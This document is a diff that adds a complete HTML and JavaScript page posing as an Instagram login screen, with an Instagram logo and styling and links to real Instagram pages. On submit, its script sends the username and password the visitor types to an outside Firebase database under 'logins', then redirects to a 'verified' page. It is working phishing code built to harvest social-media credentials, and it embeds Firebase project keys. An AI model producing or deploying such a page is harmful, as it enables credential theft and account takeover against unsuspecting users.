@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      background-color: #000;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      width: 350px;
+      text-align: center;
+    }
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 50px;
+      margin-bottom: 30px;
+      color: #fff;
+      user-select: none;
+      -webkit-user-drag: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      background-color: #000 !important;
+      border: 1px solid #363636;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      caret-color: #fff;
+    }
+    input::placeholder {
+      color: #8e8e8e;
+    }
+    input:-webkit-autofill,
+    input:-webkit-autofill:hover,
+    input:-webkit-autofill:focus,
+    input:-webkit-autofill:active {
+      -webkit-box-shadow: 0 0 0px 1000px #000 inset !important;
+      -webkit-text-fill-color: #fff !important;
+      caret-color: #fff !important;
+      border: 1px solid #363636 !important;
+    }
+    input:focus {
+      background-color: #000;
+      border-color: #555;
+    }
+    .password-box { position: relative; }
+    .show-btn {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: 1px solid #363636;
+      color: #fff;
+      border-radius: 4px;
+      font-size: 13px;
+      padding: 4px 8px;
+      cursor: pointer;
+    }
+    .login-btn {
+      width: 100%;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      padding: 10px;
+      margin-top: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 15px;
+    }
+    .login-btn:hover {
+      background-color: #1877f2;
+    }
+    .or-section {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
+    }
+    .or-section hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid #363636;
+    }
+    .or-section span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-size: 13px;
+    }
+    .facebook-login {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .facebook-login i {
+      margin-right: 6px;
+    }
+    .forgot { margin-top: 15px; font-size: 13px; }
+    .forgot a {
+      color: #fff;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    a:hover { text-decoration: underline; }
+    @font-face {
+      font-family: 'Billabong';
+      src: url('https://fonts.cdnfonts.com/s/17051/Billabong.woff') format('woff');
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img class="logo" src="https://image2url.com/images/1762138591204-e289ff02-680c-4482-b748-0fd1bf430dbe.png" alt="Instagram Logo">
+
+    <form id="loginForm" autocomplete="off">
+      <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off" required>
+      <div class="password-box">
+        <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+        <button type="button" class="show-btn" id="togglePassword">Show</button>
+      </div>
+      <button type="submit" class="login-btn">Verify</button>
+    </form>
+
+    <div class="or-section">
+      <hr><span>OR</span><hr>
+    </div>
+
+    <a href="https://www.instagram.com/accounts/emailsignup/" class="facebook-login">
+      <i class="fa-brands fa-facebook"></i>Log in with Facebook
+    </a>
+
+    <div class="forgot">
+      <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+    </div>
+
+    <div class="signup">
+      Don't have an account?
+      <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyDqYk7Bh_YKdBnsDJSxmzh9r_T0OSFEl1c",
+  authDomain: "insta-login-bfc4e.firebaseapp.com",
+  databaseURL: "https://insta-login-bfc4e-default-rtdb.firebaseio.com",
+  projectId: "insta-login-bfc4e",
+  storageBucket: "insta-login-bfc4e.firebasestorage.app",
+  messagingSenderId: "879189238217",
+  appId: "1:879189238217:web:1bd62250275dcf5cfe0818",
+  measurementId: "G-PL0L0TK66S"
+};
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // Password toggle
+  const togglePassword = document.getElementById('togglePassword');
+  const passwordInput = document.getElementById('password');
+  togglePassword.style.display = "none";
+  passwordInput.addEventListener('input', () => {
+    togglePassword.style.display = passwordInput.value === "" ? "none" : "block";
+  });
+  togglePassword.addEventListener('click', () => {
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      togglePassword.textContent = 'Hide';
+    } else {
+      passwordInput.type = 'password';
+      togglePassword.textContent = 'Show';
+    }
+  });
+
+  // Form submit
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    db.ref('logins').push({
+      username: username,
+      password: password,
+      timestamp: new Date().toISOString()
+    })
+    .then(() => {
+      console.log("Data saved to Firebase");
+      window.location.href = 'verified.html';
+    })
+    .catch((error) => {
+      console.error("Firebase write failed:", error.message);
+      alert("Error: " + error.message);
+    });
+  });
+</script>
+
+</body>
+</html>
